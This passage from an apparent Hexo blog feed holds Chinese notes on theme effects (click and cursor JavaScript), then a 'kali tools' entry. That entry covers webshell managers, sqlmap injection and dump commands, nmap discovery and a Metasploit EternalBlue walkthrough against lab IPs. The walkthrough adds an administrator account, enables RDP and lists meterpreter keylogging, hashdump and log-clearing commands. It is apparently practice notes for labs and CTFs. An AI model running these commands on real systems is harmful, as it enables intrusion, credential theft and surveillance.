<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!function(e,t,a)&#123;function n()&#123;c(&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;),o(),r()&#125;function r()&#123;for(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText=&quot;left:&quot;+d[e].x+&quot;px;top:&quot;+d[e].y+&quot;px;opacity:&quot;+d[e].alpha+&quot;;transform:scale(&quot;+d[e].scale+&quot;,&quot;+d[e].scale+&quot;) rotate(45deg);background:&quot;+d[e].color+&quot;;z-index:99999&quot;);requestAnimationFrame(r)&#125;function o()&#123;var t=&quot;function&quot;==typeof e.onclick&amp;&amp;e.onclick;e.onclick=function(e)&#123;t&amp;&amp;t(),i(e)&#125;&#125;function i(e)&#123;var a=t.createElement(&quot;div&quot;);a.className=&quot;heart&quot;,d.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()&#125;),t.body.appendChild(a)&#125;function c(e)&#123;var a=t.createElement(&quot;style&quot;);a.type=&quot;text/css&quot;;try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(&quot;head&quot;)[0].appendChild(a)&#125;function s()&#123;return&quot;rgb(&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;)&quot;&#125;var d=[];e.requestAnimationFrame=function()&#123;return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e)&#123;setTimeout(e,1e3/60)&#125;&#125;(),n()&#125;(window,document);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在 <strong>\themes\next\layout_layout.njk</strong> 文件末尾添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 页面点击小红心 --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clicklove.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="鼠标跟随特效"><a href="#鼠标跟随特效" class="headerlink" title="鼠标跟随特效"></a>鼠标跟随特效</h1><p><a href="https://sweetolive.github.io/2020/07/17/1/">Hexo next主题添加鼠标特效 | 佘一人 (sweetolive.github.io)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function cherry() &#123;</span><br><span class="line">  var possibleColors = [&quot;#D61C59&quot;, &quot;#E7D84B&quot;, &quot;#1B8798&quot;]</span><br><span class="line">  var width = window.innerWidth;</span><br><span class="line">  var height = window.innerHeight;</span><br><span class="line">  var cursor = &#123;x: width/2, y: width/2&#125;;</span><br><span class="line">  var particles = [];</span><br><span class="line">  </span><br><span class="line">  function init() &#123;</span><br><span class="line">    bindEvents();</span><br><span class="line">    loop();</span><br><span class="line">  &#125;  </span><br><span class="line">  // Bind events that are needed</span><br><span class="line">  function bindEvents() &#123;</span><br><span class="line">    document.addEventListener(&#x27;mousemove&#x27;, onMouseMove);</span><br><span class="line">    document.addEventListener(&#x27;touchmove&#x27;, onTouchMove);</span><br><span class="line">    document.addEventListener(&#x27;touchstart&#x27;, onTouchMove);</span><br><span class="line">    </span><br><span class="line">    window.addEventListener(&#x27;resize&#x27;, onWindowResize);</span><br><span class="line">  &#125;  </span><br><span class="line">  function onWindowResize(e) &#123;</span><br><span class="line">    width = window.innerWidth;</span><br><span class="line">    height = window.innerHeight;</span><br><span class="line">  &#125; </span><br><span class="line">  function onTouchMove(e) &#123;</span><br><span class="line">    if( e.touches.length &gt; 0 ) &#123;</span><br><span class="line">      for( var i = 0; i &lt; e.touches.length; i++ ) &#123;</span><br><span class="line">        addParticle( e.touches[i].clientX, e.touches[i].clientY, possibleColors[Math.floor(Math.random()*possibleColors.length)]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function onMouseMove(e) &#123;    </span><br><span class="line">    cursor.x = e.clientX;</span><br><span class="line">    cursor.y = e.clientY;</span><br><span class="line">    </span><br><span class="line">    addParticle( cursor.x, cursor.y, possibleColors[Math.floor(Math.random()*possibleColors.length)]);</span><br><span class="line">  &#125;</span><br><span class="line">  function addParticle(x, y, color) &#123;</span><br><span class="line">    var particle = new Particle();</span><br><span class="line">    particle.init(x, y, color);</span><br><span class="line">    particles.push(particle);</span><br><span class="line">  &#125;</span><br><span class="line">  function updateParticles() &#123;</span><br><span class="line">    for( var i = 0; i &lt; particles.length; i++ ) &#123;</span><br><span class="line">      particles[i].update();</span><br><span class="line">    &#125;</span><br><span class="line">    for( var i = particles.length -1; i &gt;= 0; i-- ) &#123;</span><br><span class="line">      if( particles[i].lifeSpan &lt; 0 ) &#123;</span><br><span class="line">        particles[i].die();</span><br><span class="line">        particles.splice(i, 1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function loop() &#123;</span><br><span class="line">    requestAnimationFrame(loop);</span><br><span class="line">    updateParticles();</span><br><span class="line">  &#125;</span><br><span class="line">  function Particle() &#123;</span><br><span class="line">    this.character = &quot;*&quot;;</span><br><span class="line">    this.lifeSpan = 120; //ms</span><br><span class="line">    this.initialStyles =&#123;</span><br><span class="line">      &quot;position&quot;: &quot;fixed&quot;,</span><br><span class="line">      &quot;top&quot;: &quot;0&quot;, //必须加</span><br><span class="line">      &quot;display&quot;: &quot;block&quot;,</span><br><span class="line">      &quot;pointerEvents&quot;: &quot;none&quot;,</span><br><span class="line">      &quot;z-index&quot;: &quot;10000000&quot;,</span><br><span class="line">      &quot;fontSize&quot;: &quot;20px&quot;,</span><br><span class="line">      &quot;will-change&quot;: &quot;transform&quot;</span><br><span class="line">    &#125;;</span><br><span class="line">    this.init = function(x, y, color) &#123;</span><br><span class="line">      this.velocity = &#123;</span><br><span class="line">        x:  (Math.random() &lt; 0.5 ? -1 : 1) * (Math.random() / 2),</span><br><span class="line">        y: 1</span><br><span class="line">      &#125;;</span><br><span class="line">      this.position = &#123;x: x - 10, y: y - 20&#125;;</span><br><span class="line">      this.initialStyles.color = color;</span><br><span class="line">      console.log(color);</span><br><span class="line"></span><br><span class="line">      this.element = document.createElement(&#x27;span&#x27;);</span><br><span class="line">      this.element.innerHTML = this.character;</span><br><span class="line">      applyProperties(this.element, this.initialStyles);</span><br><span class="line">      this.update();</span><br><span class="line">      </span><br><span class="line">      document.body.appendChild(this.element);</span><br><span class="line">    &#125;;</span><br><span class="line">    this.update = function() &#123;</span><br><span class="line">      this.position.x += this.velocity.x;</span><br><span class="line">      this.position.y += this.velocity.y;</span><br><span class="line">      this.lifeSpan--;</span><br><span class="line">      this.element.style.transform = &quot;translate3d(&quot; + this.position.x + &quot;px,&quot; + this.position.y + &quot;px,0) scale(&quot; + (this.lifeSpan / 120) + &quot;)&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    this.die = function() &#123;</span><br><span class="line">      this.element.parentNode.removeChild(this.element);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function applyProperties( target, properties ) &#123;</span><br><span class="line">    for( var key in properties ) &#123;</span><br><span class="line">      target.style[ key ] = properties[ key ];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  init();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<h4 id="在themes-next-layout新建文件夹-custom"><a href="#在themes-next-layout新建文件夹-custom" class="headerlink" title="在themes\next\layout新建文件夹_custom"></a>在themes\next\layout新建文件夹_custom</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.cursor_effect %&#125;</span><br><span class="line">  &#123;%- if theme.cursor_effect.type == &quot;explosion&quot; %&#125;</span><br><span class="line">    &lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt;</span><br><span class="line">    &lt;script src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/explosion.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;%- elseif theme.cursor_effect.type == &quot;cherry&quot; %&#125;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/cherry.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>

<h4 id="在themes-next-layout下找到-layout-swig，添加下面代码"><a href="#在themes-next-layout下找到-layout-swig，添加下面代码" class="headerlink" title="在themes\next\layout下找到_layout.swig，添加下面代码"></a>在themes\next\layout下找到_layout.swig，添加下面代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% include &#x27;_custom/custom.swig&#x27; %&#125;</span><br></pre></td></tr></table></figure>

<h4 id="最后在主题配置文件-config-yml，添加下面代码，type选择不同特效"><a href="#最后在主题配置文件-config-yml，添加下面代码，type选择不同特效" class="headerlink" title="最后在主题配置文件_config.yml，添加下面代码，type选择不同特效"></a>最后在主题配置文件_config.yml，添加下面代码，type选择不同特效</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cherry: 樱花 | explosion：爆炸 </span><br><span class="line">cursor_effect:</span><br><span class="line">  enabled: true</span><br><span class="line">  type: cherry </span><br></pre></td></tr></table></figure>

<h2 id="设置透明度"><a href="#设置透明度" class="headerlink" title="设置透明度"></a>设置透明度</h2><p>单独给每个区域设置opacity会出现很多问题，例如搜索框弹出会被覆盖图层导致无法进行本地搜索</p>
<p>最理想是进行全局设置，在 <code>blog\source\_data\styles.styl</code> 中 直接设置body的透明度为0.85 全体透明化，opacity的值可以自行调整</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//背景图片设置</span><br><span class="line">body &#123;</span><br><span class="line">    background-image: url(/images/bg1.jpg);</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">    background-attachment: fixed;</span><br><span class="line">    background-size: 100% 100%;</span><br><span class="line">    opacity: 0.85;</span><br><span class="line">    //可选</span><br><span class="line">    +mobile()&#123;</span><br><span class="line">      background-image: url(https://ziyuan.lruihao.cn/images/bg_cell.png);</span><br><span class="line">      background-size: cover;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="樱花飘落特效"><a href="#樱花飘落特效" class="headerlink" title="樱花飘落特效"></a>樱花飘落特效</h1><p><a href="https://bobboss.github.io/posts/ac603ad1.html">樱花飘落特效 | BobBoss Blog</a></p>
<h2 id="rsa加密问题"><a href="#rsa加密问题" class="headerlink" title="rsa加密问题"></a>rsa加密问题</h2><p>[(15条消息) 解决<a href="mailto:&#x67;&#105;&#116;&#64;&#x67;&#x69;&#116;&#104;&#x75;&#x62;&#46;&#x63;&#x6f;&#x6d;">&#x67;&#105;&#116;&#64;&#x67;&#x69;&#116;&#104;&#x75;&#x62;&#46;&#x63;&#x6f;&#x6d;</a>: Permission denied (publickey). Could not read from remote repository_ywl470812087的博客-CSDN博客](<a href="https://blog.csdn.net/ywl470812087/article/details/104459288?ops_request_misc=%7B%22request_id%22:%22168481639316800197061390%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168481639316800197061390&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-104459288-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=">https://blog.csdn.net/ywl470812087/article/details/104459288?ops_request_misc=%7B%22request%5Fid%22%3A%22168481639316800197061390%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168481639316800197061390&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-104459288-null-null.142^v87^control_2,239^v2^insert_chatgpt&amp;utm_term=</a> Could not read from remote repository&amp;spm&#x3D;1018.2226.3001.4187)</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>kali工具</title>
    <url>/2023/04/03/kali%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[  <span id="more"></span>

<h2 id="蚁剑下载"><a href="#蚁剑下载" class="headerlink" title="蚁剑下载"></a>蚁剑下载</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gitee.com/AntSwordProject/AntSword-Loader</span><br></pre></td></tr></table></figure>

<h2 id="behinder使用"><a href="#behinder使用" class="headerlink" title="behinder使用"></a>behinder使用</h2><p>下载地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder/releases</span><br></pre></td></tr></table></figure>

<p>由于自己再windos下弄不好决定弄到kali上，kali没有java环境需要配置java环境</p>
<p>下载解压，在目录里打开终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br></pre></td></tr></table></figure>

<p>behinder 普通的后门是用不了只能用behinder的后门连接</p>
<h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><p>sqlmap常用命令总结：<br>注意：命令为kali linux中运行的 （windows中用python sqlmap.py执行）</p>
<p>1#、注入六连：</p>
<ol>
<li><p>sqlmap -u  “<a href="http://www.xx.com/?id=x">http://www.xx.com?id=x</a>“    【查询是否存在注入点</p>
</li>
<li><p>–dbs         【检测站点包含哪些数据库</p>
</li>
<li><p>–current-db    【获取当前的数据库名</p>
</li>
<li><p>–tables -D “db_name”  【获取指定数据库中的表名 -D后接指定的数据库名称</p>
</li>
<li><p>–columns  -T “table_name” -D “db_name”  【获取数据库表中的字段</p>
</li>
<li><p>–dump -C “columns_name” -T “table_name” -D “db_name”  【获取字段的数据内容</p>
</li>
</ol>
<p>2#、COOKIE注入：<br>sqlmap -u “<a href="http://www.xx.com/?id=x">http://www.xx.com?id=x</a>“ –cookie “cookie” –level 2  【cookie注入 后接cookie值</p>
<p>3#、POST注入：<br>（1）目标地址http:&#x2F;&#x2F; <a href="http://www.xxx.com/">www.xxx.com</a> &#x2F;login.asp<br>（2）打开brup代理。<br>（3）点击表单提交<br>（4）burp获取拦截信息（post）<br>（5）右键保存文件（.txt）到指定目录下<br>（6）运行sqlmap并执行如下命令：<br>用例：sqlmap -r okay.txt  -p  username</p>
<p>&#x2F;&#x2F; -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）</p>
<p>（7）自动获取表单：–forms自动获取表单</p>
<p>例如：sqlmap -u <a href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> –forms</p>
<p>（8）指定参数搜索：–data</p>
<p>例如:sqlmap -u <a href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> –data “username&#x3D;1”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u 指定目标URL (可以是http协议也可以是https协议)</span><br><span class="line"> </span><br><span class="line">-d 连接数据库</span><br><span class="line"> </span><br><span class="line">--dbs 列出所有的数据库</span><br><span class="line"> </span><br><span class="line">--current-db 列出当前数据库</span><br><span class="line"> </span><br><span class="line">--tables 列出当前的表</span><br><span class="line"> </span><br><span class="line">--columns 列出当前的列</span><br><span class="line"> </span><br><span class="line">-D 选择使用哪个数据库</span><br><span class="line"> </span><br><span class="line">-T 选择使用哪个表</span><br><span class="line"> </span><br><span class="line">-C 选择使用哪个列</span><br><span class="line"> </span><br><span class="line">--dump 获取字段中的数据</span><br><span class="line"> </span><br><span class="line">--batch 自动选择yes</span><br><span class="line"> </span><br><span class="line">--smart 启发式快速判断，节约浪费时间</span><br><span class="line"> </span><br><span class="line">--forms 尝试使用post注入</span><br><span class="line"> </span><br><span class="line">-r 加载文件中的HTTP请求（本地保存的请求包txt文件）</span><br><span class="line"> </span><br><span class="line">-l 加载文件中的HTTP请求（本地保存的请求包日志文件）</span><br><span class="line"> </span><br><span class="line">-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试</span><br><span class="line"> </span><br><span class="line">-o 开启所有默认性能优化</span><br><span class="line"> </span><br><span class="line">--tamper 调用脚本进行注入</span><br><span class="line"> </span><br><span class="line">-v 指定sqlmap的回显等级</span><br><span class="line"> </span><br><span class="line">--delay 设置多久访问一次</span><br><span class="line"> </span><br><span class="line">--os-shell 获取主机shell，一般不太好用，因为没权限</span><br><span class="line"> </span><br><span class="line">-m 批量操作</span><br><span class="line"> </span><br><span class="line">-c 指定配置文件，会按照该配置文件执行动作</span><br><span class="line"> </span><br><span class="line">-data data指定的数据会当做post数据提交</span><br><span class="line"> </span><br><span class="line">-timeout 设定超时时间</span><br><span class="line"> </span><br><span class="line">--level 设置注入探测等级</span><br><span class="line"> </span><br><span class="line">--risk 风险等级</span><br><span class="line"> </span><br><span class="line">--identify-waf 检测防火墙类型</span><br><span class="line"> </span><br><span class="line">--param-del=&quot;分割符&quot; 设置参数的分割符</span><br><span class="line"> </span><br><span class="line">--skip-urlencode 不进行url编码</span><br><span class="line"> </span><br><span class="line">--keep-alive 设置持久连接，加快探测速度</span><br><span class="line"> </span><br><span class="line">--null-connection 检索没有body响应的内容，多用于盲注</span><br><span class="line"> </span><br><span class="line">--thread 最大为10 设置多线程</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/songbai220/article/details/109303110">(10条消息) sqlmap使用教程(超详细)_Redmaple925的博客-CSDN博客</a></p>
<h2 id="nmap使用"><a href="#nmap使用" class="headerlink" title="nmap使用"></a>nmap使用</h2><p>nmap常用命令<br>主机发现 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描</span><br><span class="line">-sn                     ping扫描,即主机发现</span><br><span class="line">-Pn                     不检测主机存活</span><br><span class="line">-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现</span><br><span class="line">-PE/PP/PM               使用ICMP echo, timestamp and netmask 请求包发现主机</span><br><span class="line">-PO[prococol list]      使用IP协议包探测对方主机是否开启   </span><br><span class="line">-n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析</span><br></pre></td></tr></table></figure>

<p>awd主机发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=open(&#x27;pingtest.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">for i in range(255):</span><br><span class="line">    ip = &quot;192-168-1-&quot; + str(i) +&quot;.pvp2155.bugku.cn&quot;</span><br><span class="line">    f.write(ip+&#x27;\n&#x27;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>批量扫描存货主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -iL /home/zhou/桌面/pingtest.txt -sn</span><br></pre></td></tr></table></figure>



<h2 id="dirsearch使用"><a href="#dirsearch使用" class="headerlink" title="dirsearch使用"></a>dirsearch使用</h2><p>常用于暴力扫描页面结构，包括网页中的目录和文件</p>
<p>简单使用</p>
<p>-u,–url                    目标url<br>-l,–url-list&#x3D;FILE          目标url文件路径<br>–stdin                     从标准输入中指定url<br>–cidr                      目标网段<br>–raw&#x3D;File                  从文件中读取request报文,通过-schema指定策略(如–schema https)</p>
<p><a href="https://so.csdn.net/so/search?q=dirsearch&t=&u=&urw=">dirsearch- CSDN搜索</a> </p>
<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>永恒之蓝</p>
<p>windos7镜像下载</p>
<p><a href="https://www.imsdn.cn/windows-server/windows-server-2008-r2/">Windows Server 2008 R2 ISO镜像下载 - 我的MSDN (imsdn.cn)</a></p>
<p>1.启动msf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p>2.搜索可以用的模板</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 3   #使用auxiliary/scanner/smb/smb_ms17_010  进行扫描是否存在MS17-010漏洞</span><br><span class="line">show options   #查看需要设置的参数</span><br><span class="line">set rhosts 192.168.158.150</span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<p>若存在如上图所示</p>
<ol start="4">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use 0 #exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码</span><br><span class="line">show options   #查看需要设置的参数</span><br><span class="line">set rhosts 192.168.158.150 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>攻击完成</p>
<p>5.显示   win  字样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell    #进入命令行</span><br><span class="line">chcp 65001    ##切换编码，解决乱码问题</span><br><span class="line">exit   #离开shell</span><br><span class="line">background #把我们获得的meterpreter会话挂载到后台运行</span><br><span class="line">sessions   #显示所有会话</span><br><span class="line">sessions id   #进入会话</span><br></pre></td></tr></table></figure>



<ol start="6">
<li></li>
</ol>
<p>1、创建新用户 ，语法：net user 用户名 密码 &#x2F;add</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user sss @123qwe /add</span><br><span class="line">net localgroup administrators sss /add  #将用户sss添加至管理员组</span><br></pre></td></tr></table></figure>

<p>7</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>

<p>8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdesktop 192.168.184.138</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Meterpreter &gt; ?</span><br><span class="line">==========================================</span><br><span class="line">核心命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">?                             帮助菜单</span><br><span class="line">background                    把当前会话挂到后台运行</span><br><span class="line">bg                            background命令的别名</span><br><span class="line">bgkill                        杀死后台meterpreter 脚本</span><br><span class="line">bglist                        列出正在运行的后台脚本</span><br><span class="line">bgrun                         执行一个meterpreter脚本作为后台线程</span><br><span class="line">channel                       显示信息或控制活动频道</span><br><span class="line">close                         关闭一个频道</span><br><span class="line">detach                        分离Meterpreter会话（用于 http/https）</span><br><span class="line">disable_unicode_encoding      禁用 unicode 字符串的编码</span><br><span class="line">enable_unicode_encoding       启用 unicode 字符串的编码</span><br><span class="line">exit                          终止 Meterpreter 会话</span><br><span class="line">get_timeouts                  获取当前会话超时值</span><br><span class="line">guid                          获取会话 GUID</span><br><span class="line">help                          帮助菜单</span><br><span class="line">info                          显示有关 Post 模块的信息</span><br><span class="line">irb                           在当前会话中打开一个交互式 Ruby shell</span><br><span class="line">load                          加载一个或多个 Meterpreter 扩展</span><br><span class="line">machine_id                    获取连接到会话的机器的 MSF ID</span><br><span class="line">migrate                       将服务器迁移到另一个进程</span><br><span class="line">pivot                         管理枢轴侦听器</span><br><span class="line">pry                           在当前会话上打开 Pry 调试器</span><br><span class="line">quit                          终止 Meterpreter 会话</span><br><span class="line">read                          从通道读取数据</span><br><span class="line">resource                      运行存储在文件中的命令</span><br><span class="line">run                           执行一个 Meterpreter 脚本或 Post 模块</span><br><span class="line">secure                       （重新）协商会话上的 TLV 数据包加密</span><br><span class="line">sessions                      快速切换到另一个会话</span><br><span class="line">set_timeouts                  设置当前会话超时值</span><br><span class="line">sleep                         强制 Meterpreter 安静，然后重新建立会话</span><br><span class="line">ssl_verify                    修改 SSL 证书验证设置</span><br><span class="line">transport                     管理运输机制</span><br><span class="line">use                           不推荐使用的load命令别名</span><br><span class="line">uuid                          获取当前会话的 UUID</span><br><span class="line">write                         将数据写入通道</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：文件系统命令</span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">cat                           将文件内容读到屏幕上</span><br><span class="line">cd                            切换目录</span><br><span class="line">checksum                      检索文件的校验和</span><br><span class="line">cp                            将源复制到目标</span><br><span class="line">del                           删除指定文件</span><br><span class="line">dir                           列出文件（ls 的别名）</span><br><span class="line">download                      下载文件或目录</span><br><span class="line">edit                          编辑文件</span><br><span class="line">getlwd                        打印本地工作目录</span><br><span class="line">getwd                         打印工作目录</span><br><span class="line">lcd                           更改本地工作目录</span><br><span class="line">lls                           列出本地文件</span><br><span class="line">lpwd                          打印本地工作目录</span><br><span class="line">ls                            列出文件</span><br><span class="line">mkdir                         制作目录</span><br><span class="line">mv                            将源移动到目标</span><br><span class="line">pwd                           打印工作目录</span><br><span class="line">rm                            删除指定文件</span><br><span class="line">rmdir                         删除目录</span><br><span class="line">search                        搜索文件</span><br><span class="line">show_mount                    列出所有挂载点/逻辑驱动器</span><br><span class="line">upload                        上传文件或目录</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">arp                           显示主机 ARP 缓存</span><br><span class="line">getproxy                      显示当前代理配置</span><br><span class="line">ifconfig                      显示界面</span><br><span class="line">ipconfig                      显示接口</span><br><span class="line">netstat                       显示网络连接</span><br><span class="line">portfwd                       将本地端口转发到远程服务</span><br><span class="line">resolve                       解析目标上的一组主机名</span><br><span class="line">route                         查看和修改路由表</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：系统命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">clearev                       清除事件日志</span><br><span class="line">drop_token                    放弃任何活动的模拟令牌。</span><br><span class="line">execute                       执行命令</span><br><span class="line">getenv                        获取一个或多个环境变量值</span><br><span class="line">getpid                        获取当前进程标识符</span><br><span class="line">getprivs                      尝试启用当前进程可用的所有权限</span><br><span class="line">getid                         获取服务器运行的用户的 SID</span><br><span class="line">getuid                        获取服务器运行的用户</span><br><span class="line">kill                          终止进程</span><br><span class="line">localtime                     显示目标系统本地日期和时间</span><br><span class="line">pgrep                         按名称过滤进程</span><br><span class="line">pkill                         按名称终止进程</span><br><span class="line">ps                            列出正在运行的进程</span><br><span class="line">reboot                        重启远程计算机</span><br><span class="line">reg                           修改远程注册表并与之交互</span><br><span class="line">rev2self                      在远程机器上调用 RevertToSelf()</span><br><span class="line">shell                         放入系统命令 shell</span><br><span class="line">shutdown                      关闭远程计算机</span><br><span class="line">steal_token                   尝试从目标进程窃取模拟令牌</span><br><span class="line">suspend                       暂停或恢复进程列表</span><br><span class="line">sysinfo                       获取有关远程系统的信息，例如 OS</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：用户界面命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">enumdesktops                  列出所有可访问的桌面和窗口站</span><br><span class="line">getdesktop                    获取当前的meterpreter桌面</span><br><span class="line">idletime                      返回远程用户空闲的秒数</span><br><span class="line">keyboard_send                 发送击键</span><br><span class="line">keyevent                      发送按键事件</span><br><span class="line">keyscan_dump                  转储击键缓冲区</span><br><span class="line">keyscan_start                 开始捕获击键</span><br><span class="line">keyscan_stop                  停止捕获击键</span><br><span class="line">mouse                         发送鼠标事件</span><br><span class="line">screenshare                   实时观看远程用户桌面</span><br><span class="line">screenshot                    抓取交互式桌面的截图</span><br><span class="line">setdesktop                    更改meterpreters当前桌面</span><br><span class="line">uictl                         控制一些用户界面组件</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络摄像头命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">record_mic                    从默认麦克风录制音频 X 秒</span><br><span class="line">webcam_chat                   开始视频聊天</span><br><span class="line">webcam_list                   列出网络摄像头</span><br><span class="line">webcam_snap                   从指定的网络摄像头拍摄快照</span><br><span class="line">webcam_stream                 从指定的网络摄像头播放视频流</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：音频输出命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">play                          在目标系统上播放波形音频文件 (.wav)</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：权限提升命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">getsystem                     尝试将您的权限提升到本地系统的权限。</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：密码数据库命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">hashdump                      转储 SAM 数据库的内容</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：Timestomp 命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span 